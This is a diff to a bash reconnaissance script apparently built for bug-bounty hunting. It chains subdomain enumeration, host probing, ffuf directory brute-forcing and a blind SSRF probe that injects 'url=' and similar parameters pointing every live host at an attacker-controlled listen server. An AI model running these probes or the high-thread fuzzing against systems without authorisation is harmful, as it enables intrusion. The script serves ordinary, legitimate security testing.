@@ -7,6 +7,8 @@ set -m
 . ./lazyconfig
 
 # background PID's control
+PID_SUBFINDER_FIRST=
+PID_ASSETFINDER=
 PID_GAU=
 PID_WAYBACK=
 SERVER_PID=
@@ -65,16 +67,16 @@ enumeratesubdomains(){
     echo "subfinder..."
     echo $1 >> $TARGETDIR/subfinder-list.txt # to be sure main domain added in case of one domain scope
     subfinder -d $1 -silent -o $TARGETDIR/subfinder-list.txt &
-    pid1=$!
+    PID_SUBFINDER_FIRST=$!
 
     echo "assetfinder..."
     assetfinder --subs-only $1 > $TARGETDIR/assetfinder-list.txt &
-    pid2=$!
+    PID_ASSETFINDER=$!
 
     echo "github-subdomains.py..."
-    github-subdomains -d $1 -t $GITHUBTOKEN | sed "s/^\.//;/error/d" > $TARGETDIR/github-subdomains-list.txt
+    github-subdomains -d $1 -t $GITHUBTOKEN | sed "s/^\.//;/error/d" | grep "[.]${1}" > $TARGETDIR/github-subdomains-list.txt
 
-    wait $pid1 $pid2
+    wait $PID_SUBFINDER_FIRST $PID_ASSETFINDER
 
     # echo "amass..."
     # amass enum --passive -log $TARGETDIR/amass_errors.log -d $1 -o $TARGETDIR/amass-list.txt
@@ -84,8 +86,14 @@ enumeratesubdomains(){
     grep "[.]${SCOPE}$" $TARGETDIR/assetfinder-list.txt | sort -u -o $TARGETDIR/assetfinder-list.txt
     sed "${SEDOPTION[@]}" '/^*/d' $TARGETDIR/assetfinder-list.txt
     # sort enumerated subdomains
-    sort -u $TARGETDIR/subfinder-list.txt $TARGETDIR/assetfinder-list.txt $TARGETDIR/github-subdomains-list.txt -o $TARGETDIR/enumerated-subdomains.txt
+    sort -u "$TARGETDIR"/subfinder-list.txt $TARGETDIR/assetfinder-list.txt "$TARGETDIR"/github-subdomains-list.txt -o "$TARGETDIR"/enumerated-subdomains.txt
     sed "${SEDOPTION[@]}" '/^[.]/d' $TARGETDIR/enumerated-subdomains.txt
+
+    if [[ -n "$alt" && -s "$TARGETDIR"/enumerated-subdomains.txt ]]; then
+      echo "[subfinder] second try..."
+      subfinder -all -dL "${TARGETDIR}"/enumerated-subdomains.txt -silent -o "${TARGETDIR}"/subfinder-list-2.txt
+      sort -u "$TARGETDIR"/enumerated-subdomains.txt "$TARGETDIR"/subfinder-list-2.txt -o "$TARGETDIR"/enumerated-subdomains.txt
+    fi
   fi
 }
 
@@ -106,7 +114,7 @@ getgau(){
 }
 getgithubendpoints(){
   echo "github-endpoints.py..."
-  github-endpoints -d $1 -t $GITHUBTOKEN | sort | uniq | qsreplace -a > $TARGETDIR/wayback/github-endpoints_out.txt
+  github-endpoints -d $1 -t $GITHUBTOKEN | sort | uniq | grep "[.]${1}" | qsreplace -a > $TARGETDIR/wayback/github-endpoints_out.txt
   echo "github-endpoints done"
 }
 
@@ -257,7 +265,7 @@ checkhttprobe(){
   fi
 
   # sort -u $TARGETDIR/httpx_output_1.txt $TARGETDIR/httpx_output_2.txt -o $TARGETDIR/3-all-subdomain-live-scheme.txt
-  cat $TARGETDIR/3-all-subdomain-live-scheme.txt | unfurl format '%d:%P' > $TARGETDIR/3-all-subdomain-live.txt
+  cat $TARGETDIR/3-all-subdomain-live-scheme.txt | unfurl format '%d:%P' > $TARGETDIR/3-all-subdomain-live-socket.txt
 }
 
 # async ability for execute chromium
@@ -405,49 +413,49 @@ ssrftest(){
     echo
     echo "[SSRF-2] Blind probe..."
     # /?url=
-    ffuf -s -c -r -u HOST/\?url=https://${LISTENSERVER}/DOMAIN \
+    ffuf -c -r -t 250 -u HOST/\?url=https://${LISTENSERVER}/DOMAIN \
         -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-        -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+        -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork > /dev/null
 
     # index.php?url=
     # ffuf -s -c -u HOST/index.php\?url=https://${LISTENSERVER}/DOMAIN/url \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork
 
     # # /?uri=
     # ffuf -s -c -u HOST/\?uri=https://${LISTENSERVER}/DOMAIN/ \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork
 
     # # /?redirect_to=
     # ffuf -s -c -u HOST/\?redirect_to=$LISTENSERVER/DOMAIN/ \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork
 
     # # /?page=
     # ffuf -s -c -u HOST/\?page=$LISTENSERVER/DOMAIN/ \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork
 
     # # /?p=
     # ffuf -s -c -u HOST/\?p=$LISTENSERVER/DOMAIN/ \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork
 
     # # ?url=&file=
     # ffuf -s -c -u HOST/\?url=https://${LISTENSERVER}/DOMAIN/url\&file=https://${LISTENSERVER}/DOMAIN/file \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork
 
     # # manifest.json?url=
     # ffuf -s -c -u HOST/manifest.json\?url=https://${LISTENSERVER}/DOMAIN/url \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork
 
     # # ?returnUrl=
     # ffuf -s -c -u HOST/\?returnUrl=https://${LISTENSERVER}/DOMAIN/url \
     #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork
 
     if [[ -n "$mad" && -s "$customSsrfQueryList" ]]; then
       # similar to paramspider but all wayback without limits
@@ -469,7 +477,7 @@ ssrftest(){
         echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
         echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
 
-          ffuf -s -r -c -t 50 -u HOST/PATH \
+          ffuf -r -c -t 250 -u HOST/PATH \
               -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
               -w $TARGETDIR/ssrf-list.txt:PATH > /dev/null
       fi
@@ -583,8 +591,8 @@ ffufbrute(){
     iterator=1
     while read subdomain; do
       # -c stands for colorized, -s for silent mode
-      ffuf -c -s -u ${subdomain}/FUZZ -p 0.1-2.0 -recursion -recursion-depth 2 -mc all -fc 300,301,302,303,304,400,403,404,500,501,502,503 -fs 0 -w $dirsearchWordlist -t $dirsearchThreads \
-          -o $TARGETDIR/ffuf/${iterator}.html  -of html
+      ffuf -c -u ${subdomain}/FUZZ -p 0.1-2.0 -recursion -recursion-depth 2 -mc all -fc 300,301,302,303,304,400,403,404,500,501,502,503 -fs 0 -w $dirsearchWordlist -t $dirsearchThreads \
+          -o $TARGETDIR/ffuf/${iterator}.html  -of html > /dev/null
       iterator=$((iterator+1))
     done < $TARGETDIR/3-all-subdomain-live-scheme.txt
   fi
@@ -908,6 +916,12 @@ kill_listen_server(){
 kill_background_pid(){
   echo "subshell before:"
   jobs -l
+  echo
+  if [[ -n "$PID_SUBFINDER_FIRST" || -n "$PID_ASSETFINDER" ]]; then
+    echo "kill $PID_SUBFINDER_FIRST and $PID_ASSETFINDER"
+    kill -- -${PID_SUBFINDER_FIRST} &> /dev/null || true
+    kill -- -${PID_ASSETFINDER} &> /dev/null || true
+  fi
 
   if [[ -n "$PID_GAU" || -n "$PID_WAYBACK" ]]; then
     echo "kill $PID_GAU and $PID_WAYBACK"
